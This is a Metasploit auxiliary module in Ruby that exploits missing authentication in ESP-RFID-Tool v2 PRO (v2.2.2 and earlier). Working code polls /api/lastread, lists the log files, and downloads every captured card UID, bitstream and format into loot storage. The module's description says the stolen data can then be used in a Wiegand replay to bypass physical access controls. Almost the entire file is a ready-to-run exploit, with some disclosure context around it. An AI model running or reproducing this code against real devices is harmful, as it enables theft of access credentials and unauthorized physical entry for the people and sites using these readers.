##
# ESP-RFID-Tool v2 PRO — ESPR-02
# Unauthenticated Log Read + Real-Time Card Data Exfiltration
#
# Researcher: Milan 't4c' Berger
# Advisory:   https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt
# Affected:   ESP-RFID-Tool v2 PRO <= v2.2.2 (all versions as of 2026-05-02)
# CVE:        Pending
#
# Description:
#   All API endpoints for reading captured RFID data require no authentication.
#   /api/lastread exposes the most recently captured card in real time.
#   /api/listlogs enumerates all stored log files.
#   /api/viewlog reads any log file by name.
#
#   This module dumps all captured RFID card data (UIDs, bitstreams, formats)
#   from the device without any credentials.
#
# Usage:
#   use auxiliary/gather/esp_rfid_card_dump
#   set RHOSTS 192.168.1.1
#   run
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'ESP-RFID-Tool v2 PRO — Unauthenticated Card Data Exfiltration (ESPR-02)',
        'Description' => %q{
          Exploits missing authentication on RFID data read endpoints in
          ESP-RFID-Tool v2 PRO (<= v2.2.2). An unauthenticated attacker can:

            1. Read the last captured card in real time (/api/lastread)
            2. Enumerate all stored log files (/api/listlogs)
            3. Download the full content of all log files (/api/viewlog)

          All captured card UIDs, bitstreams, and format information are
          exfiltrated without any authentication. The captured data can
          subsequently be used with ESPR-01 (Wiegand Replay) to bypass
          physical access controls.

          Discovered by Milan 't4c' Berger. Vendor notified 2026-04-27,
          deleted disclosure comment and blocked researcher. Full public
          disclosure 2026-04-28.
        },
        'Author'      => ['dRonin (tak47loss@mail.ru)'],
        'License'     => MSF_LICENSE,
        'References'  => [
          ['URL', 'https://github.com/Einstein2150/ESP-RFID-Tool-v2'],
          ['URL', 'https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt'],
          ['Researcher', 'Milan "t4c" Berger']
        ],
        'DisclosureDate' => '2026-04-28',
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(80),
      OptBool.new('DUMP_LASTREAD',
        [true, 'Dump last captured card via /api/lastread', true]
      ),
      OptBool.new('DUMP_ALL_LOGS',
        [true, 'Enumerate and dump all stored log files', true]
      ),
      OptString.new('LOGFILE',
        [false, 'Specific log file to dump (e.g. log.txt). If empty, dumps all.', '']
      ),
      OptString.new('LOOT_PATH',
        [false, 'Local path to save dumped log data (optional, uses loot store if empty)', '']
      ),
    ])
  end

  def run_host(ip)
    print_status("#{ip} — Starting unauthenticated RFID card data exfiltration")

    # --- Step 1: /api/lastread ---
    if datastore['DUMP_LASTREAD']
      dump_lastread(ip)
    end

    # --- Step 2: Enumerate + dump all logs ---
    if datastore['DUMP_ALL_LOGS']
      logfiles = list_logs(ip)
      if logfiles && !logfiles.empty?
        logfiles.each do |logfile|
          dump_logfile(ip, logfile)
        end
      end
    elsif datastore['LOGFILE'] && !datastore['LOGFILE'].empty?
      dump_logfile(ip, datastore['LOGFILE'])
    end
  end

  def dump_lastread(ip)
    print_status("#{ip} — Polling /api/lastread for most recent captured card...")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => '/api/lastread'
    })

    if res.nil? || res.code != 200
      print_warning("#{ip} — /api/lastread returned #{res.nil? ? 'no response' : res.code}")
      return
    end

    begin
      data = JSON.parse(res.body)
      bits      = data['bits']      || 'N/A'
      bitstream = data['bitstream'] || 'N/A'
      uid       = data['uid']       || 'N/A'
      format    = data['format']    || 'N/A'

      if uid == '' || uid == '0' || uid == 'N/A'
        print_status("#{ip} — No card captured yet (device idle)")
        return
      end

      print_good("#{ip} — Last captured card:")
      print_good("  UID:       #{uid}")
      print_good("  Bits:      #{bits}")
      print_good("  Bitstream: #{bitstream}")
      print_good("  Format:    #{format}")

      report_note(
        host:  ip,
        port:  datastore['RPORT'],
        proto: 'tcp',
        type:  'esp_rfid.lastread',
        data:  { uid: uid, bits: bits, bitstream: bitstream, format: format },
        update: :unique_data
      )

      report_vuln(
        host:  ip,
        port:  datastore['RPORT'],
        proto: 'tcp',
        name:  'ESP-RFID-Tool v2 PRO — Unauthenticated Card Data Read (ESPR-02)',
        info:  "Last captured UID: #{uid} (#{format}, #{bits} bits)",
        refs:  references
      )
    rescue JSON::ParserError => e
      print_warning("#{ip} — Failed to parse /api/lastread response: #{e.message}")
      print_status("#{ip} — Raw response: #{res.body[0..512]}")
    end
  end

  def list_logs(ip)
    print_status("#{ip} — Enumerating log files via /api/listlogs...")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => '/api/listlogs'
    })

    if res.nil? || res.code != 200
      print_warning("#{ip} — /api/listlogs returned #{res.nil? ? 'no response' : res.code}")
      return []
    end

    logfiles = []
    begin
      # Response is typically JSON array of filenames or newline-separated list
      if res.body.strip.start_with?('[')
        logfiles = JSON.parse(res.body)
      else
        logfiles = res.body.split(/[\r\n]+/).map(&:strip).reject(&:empty?)
      end
    rescue JSON::ParserError
      logfiles = res.body.split(/[\r\n]+/).map(&:strip).reject(&:empty?)
    end

    if logfiles.empty?
      print_status("#{ip} — No log files found")
    else
      print_good("#{ip} — Found #{logfiles.length} log file(s): #{logfiles.join(', ')}")
    end

    logfiles
  end

  def dump_logfile(ip, logfile)
    # Ensure path starts with /
    logfile = "/#{logfile}" unless logfile.start_with?('/')

    print_status("#{ip} — Dumping log file: #{logfile}")

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => '/api/viewlog',
      'vars_get' => { 'logfile' => logfile }
    })

    if res.nil? || res.code != 200
      print_warning("#{ip} — Failed to read #{logfile}: HTTP #{res.nil? ? 'timeout' : res.code}")
      return
    end

    content = res.body
    if content.empty?
      print_status("#{ip} — #{logfile} is empty")
      return
    end

    print_good("#{ip} — #{logfile} (#{content.length} bytes):")
    content.each_line do |line|
      print_status("  #{line.chomp}")
    end

    # Save to loot store
    loot_path = store_loot(
      'esp_rfid.logfile',
      'text/plain',
      ip,
      content,
      logfile.gsub('/', '_').sub(/^_/, ''),
      "ESP-RFID-Tool log: #{logfile}"
    )

    print_good("#{ip} — Saved to loot: #{loot_path}")

    report_note(
      host:  ip,
      port:  datastore['RPORT'],
      proto: 'tcp',
      type:  'esp_rfid.logfile',
      data:  { filename: logfile, content: content[0..1024] },
      update: :unique_data
    )
  end
end
